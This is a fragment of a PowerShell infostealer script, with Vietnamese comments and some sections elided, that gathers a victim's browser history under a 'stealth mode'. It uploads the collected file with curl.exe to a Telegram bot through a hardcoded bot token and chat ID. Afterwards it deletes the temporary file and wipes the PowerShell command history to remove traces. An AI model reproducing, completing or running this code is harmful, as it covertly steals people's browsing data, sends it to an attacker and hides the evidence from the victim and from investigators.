param(
    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe",
    [string]$hide = 'y'
)

# ... (Giữ nguyên Phần 1: Stealth Mode) ...

# 2. Thiết lập Telegram (Thay thế Webhook Discord)
$Token = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw" # Token bot của bạn
$ChatID = "8312702210" # Chat ID của bạn
$TeleURL = "https://api.telegram.org/bot$Token/sendDocument"
$outpath = "$env:TEMP\browser_history.txt"
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

# ... (Giữ nguyên Phần 3 & 4: Thu thập dữ liệu) ...

# 5. Gửi lên Telegram Bot và xóa dấu vết
if (Test-Path $outpath) {
    # Sử dụng curl.exe để gửi file qua Telegram API
    # Tham số -F là multipart/form-data, bắt buộc để gửi file
    curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$outpath" | Out-Null
    
    Start-Sleep -Seconds 2
    
    # Xóa file tạm ngay sau khi gửi
    Remove-Item $outpath -Force
    
    # Xóa lịch sử lệnh PowerShell (Dấu vết quan trọng)
    Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
}
